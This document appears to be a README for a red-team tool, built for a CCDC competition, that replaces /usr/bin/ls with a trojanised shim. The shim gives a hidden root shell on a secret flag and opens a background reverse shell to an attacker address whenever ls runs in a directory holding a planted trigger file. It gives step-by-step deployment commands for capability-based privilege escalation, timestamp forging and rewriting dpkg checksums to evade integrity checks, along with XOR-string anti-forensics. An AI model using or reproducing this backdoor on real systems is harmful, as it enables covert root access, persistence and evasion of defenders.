# ls2shell

A binary shim that doesn't segfault.

Replaces `/usr/bin/ls`. Normal ls works normally. Two triggers give you shells.

Built to prove a point at CCDC minicomp: writing a shim that doesn't segfault is not that hard.
Also a direct response to the x2shell trend. You know who you are.

## Triggers

**`--root-shell`**

```
blueteam@box:~$ ls --root-shell
Desktop  Documents  Downloads
# whoami
root
```

Shows normal ls output, then drops to an interactive root shell. For the demo.

**`.x2shell` trigger file**

Plant a file called `.x2shell` in any directory. Contents are `host:port` for the reverse shell callback.

```
echo "10.0.0.5:4444" > /home/blueteam/.x2shell
```

When anyone runs `ls` in that directory (or `ls /home/blueteam`), normal output appears and a reverse shell quietly connects back in the background. The trigger file self-destructs after a successful connection. If the C2 is down, the file stays for next time.

Works for bare `ls` in the cwd too. Blue team doesn't need to pass any flags.

## Build

```
make
```

Produces a ~15K dynamically linked PIE binary. Looks identical to stock ls under `file`.

## Deploy

On the target box, as root:

```bash
# stash the real one somewhere that blends in
cp /usr/bin/ls /usr/lib/lsr

# drop the shim
cp ls2shell /usr/bin/ls
chown root:root /usr/bin/ls
chmod 755 /usr/bin/ls

# privesc via capabilities (invisible to find -perm -4000)
setcap cap_setuid,cap_setgid+ep /usr/bin/ls

# match the timestamp
touch -r /usr/lib/lsr /usr/bin/ls

# fix the dpkg checksum so dpkg --verify doesn't flag it
HASH=$(md5sum /usr/bin/ls | awk '{print $1}')
sed -i '/bin\/ls$/d' /var/lib/dpkg/info/coreutils.md5sums
echo "$HASH  bin/ls" >> /var/lib/dpkg/info/coreutils.md5sums
```

Then plant triggers wherever you want callbacks:

```bash
echo "10.0.0.5:4444" > /home/blueteam/.x2shell
```

## Anti-forensics

All sensitive strings (paths, flag names, trigger filename) are XOR-encoded. `strings` on the binary shows nothing useful.

What's hardened:
- No SUID bit. Uses Linux capabilities instead, so `find / -perm -4000` is clean
- Dynamic PIE binary. `file` output matches stock ls exactly
- Stash path is `/usr/lib/lsr`, not a dotfile in `/usr/bin`
- `dpkg --verify coreutils` passes after the checksum fix
- Supplementary groups cleared on escalation (no `groups=1001(blueteam)` leak)
- Trigger file persists through failed connections

What will still catch you if someone looks:
- `strace ls` shows a `stat(".x2shell")` probe on every invocation
- `getcap /usr/bin/ls` reveals the capabilities
- `readelf -n` shows a different BuildID than the distro package
- The binary is 15K vs 135K for real ls (closer than the 831K static build, but not identical)

## Testing

```
docker compose build --no-cache
docker compose run --rm test
```

23 tests covering passthrough, both triggers, privilege escalation, anti-forensics checks.

Or drop into the box interactively:

```
docker compose run --rm target
```

## How it works

On every invocation the shim decodes a couple XOR strings and checks two things:

1. Is `--root-shell` in the args? Fork, child runs real ls, parent waits then drops to a root shell.
2. Does the target directory contain `.x2shell`? Fork, parent runs real ls normally, child connects back to the address in the file.

If neither triggers, it `execv`s the real ls with the original argv. Zero overhead on the normal path.

No heap allocation anywhere. All buffers are stack-local with bounds checks. Every syscall failure path either falls through to normal ls or `_exit`s. This is why it doesn't segfault.
